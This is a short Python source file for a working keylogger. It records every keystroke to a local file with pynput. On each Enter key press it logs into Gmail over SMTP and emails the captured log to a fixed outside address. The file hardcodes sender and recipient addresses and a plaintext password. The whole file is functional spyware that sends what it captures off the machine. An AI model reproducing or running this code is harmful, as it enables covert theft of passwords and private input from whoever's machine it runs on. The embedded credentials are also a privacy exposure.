import smtplib
import os
from pynput.keyboard import Key, Listener
from datetime import datetime
from time import time, sleep
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart


FROM = 'myspam055@gmail.com'
TO = 'kabeerasim055@gmail.com'
SERVER = 'smtp.gmail.com'
PORT = 587
PASS = 'Kabeer_123myspam055@gmail.com'


now = str(datetime.now()).split(".")[0]
def on_press(key):
    with open("D:/Python/Python Projects/Keylogger/Output.txt", "a") as f:
        f.write(f"{key}     [{now}]\n")

    if key == Key.enter:
        os.chdir('D:/Python/Python Projects/Keylogger/')
        msg = MIMEMultipart()
        msg['Subject'] = "[Captured Keystrokes] Before Enter Key"
        msg['From'] = FROM
        msg['To'] = TO
        with open("D:/Python/Python Projects/Keylogger/Output.txt", "rb") as r:
            msg.attach(MIMEApplication(r.read(), Name='Output.txt'))      
        server = smtplib.SMTP(SERVER, PORT)
        server.set_debuglevel(1)
        server.ehlo()
        server.starttls()
        server.login(FROM, PASS)
        server.sendmail(FROM, TO, msg.as_string())
        server.quit()
        with open("D:/Python/Python Projects/Keylogger/Output.txt", "w") as f:
            f.write("RESETED\n")



def on_release(key):
    if key == Key.esc:
        with open("D:/Python/Python Projects/Keylogger/Output.txt", "a") as a:
            a.write(f"{key}     [{now}]\nEscape character pressed: Breaking Out")
        print("Escape Key Pressed: Breaking Out!")
        return False
  


if __name__ == '__main__':

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
